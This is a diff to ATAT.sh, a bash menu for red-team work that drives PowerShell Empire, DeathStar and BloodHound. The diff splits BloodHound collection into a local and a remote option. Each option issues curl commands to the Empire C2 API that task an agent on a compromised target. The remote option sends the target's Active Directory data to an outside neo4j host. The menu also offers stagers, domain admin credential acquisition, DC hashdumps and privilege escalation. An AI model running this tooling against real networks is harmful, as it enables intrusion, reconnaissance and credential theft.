@@ -856,7 +856,7 @@ select opt in "${options[@]}"
 	        ;;
 	"Bloodhound")
         xterm -e neo4j console &
-        sleep 10
+        sleep 15
         xterm -e bloodhound &
         sleep 30
         firefox http://localhost:7474 &
@@ -871,6 +871,12 @@ select opt in "${options[@]}"
             echo -e "\E[1;34m::::: \e[97mCheck Empire & DeathStar Menu For \"Execute Bloodhound Data Collection\" Option To Automate Bloodhound Data Collection Once A PSE Agent Is Active On Your Target\E[1;34m:::::"
             echo ""
             echo -e "\E[1;34m::::: \e[97mThe neo4j Firefox Interface Does Not Need To Remain Open\E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97m***To Make neo4j Accept Connections Remotely You Must Make The Following Edits**\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97m***THIS ONLY NEEDS TO BE DONE ONCE!***\E[1;34m:::::"
+			echo -e "\E[1;34m::::: \e[97m**Open /usr/share/neo4j/conf/neo4j.conf With root Privileges**\E[1;34m:::::"
+			echo -e "\E[1;34m::::: \e[97mIn /usr/share/neo4j/conf/neo4j.conf You Must Uncomment This Line: dbms.connectors.default_listen_address=0.0.0.0\E[1;34m:::::"
+			echo -e "\E[1;34m::::: \e[97mThen Save /usr/share/neo4j/conf/neo4j.conf, Kill The 2 xterm Windows Opened By Running This Option & Re-Run This Option Again\E[1;34m:::::"
 			;;
     "Main Menu")
             ~/ATAT/ATAT.sh
@@ -1029,8 +1035,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 23=Main Menu | 24=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Execute Bloodhound Data Collection" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 24=Main Menu | 25=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Execute Bloodhound Data Collection - Local" "Execute Bloodhound Data Collection - Remote" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1111,10 +1117,23 @@ do
             echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/csharp_exe""
             launcher.src.zip created in the '/tmp/' directory \E[1;34m:::::"
 			;;
-		"Execute Bloodhound Data Collection")
+		"Execute Bloodhound Data Collection - Local")
+	echo -e "\E[1;34m::::: \e[97mBE CAREFUL - This Will Create CSV Files On The TARGET Machine In Your Current Directory That Will Need To Be Exfitrated & Imported Into BLoodhound Manually\E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mi.e., If Your PSE Launcher Ran From The User's Desktop, All CSV Files WILL APPEAR On Their Desktop...You Have Been Warned\E[1;34m:::::"
+	echo ""
 	pseauthtoken=~/ATAT/PSE_perm_token.txt
-    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest;
-	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"Forest":'\"$userforest\"'}' >> ~/ATAT/Bloodhound_PSE.log
+	read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"SearchForest":'\"$userforest\"'}' >> ~/ATAT/Bloodhound_PSE.log
+	        echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
+			;;
+		"Execute Bloodhound Data Collection - Remote")
+	echo -e "\E[1;34m::::: \e[97mThis Will Automatically Import All Data Directly Into BLoodhound Via The neo4j API\E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mYour neo4j Service Will Need To Be Set To Bind To 0.0.0.0 As Described In The Bloodhound Options's Documentation\E[1;34m:::::"
+	echo ""
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest; read -p 'Set URI (http://host:port/) of Bloodhound neo4j location ' useruri; read -p 'Set Bloodhound neo4j User:Password ' userpass;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"SearchForest":'\"$userforest\"',"URI":'\"$useruri\"',"UserPass":'\"$userpass\"'}' >> ~/ATAT/Bloodhound_PSE.log
 	        echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
             echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
 			;;
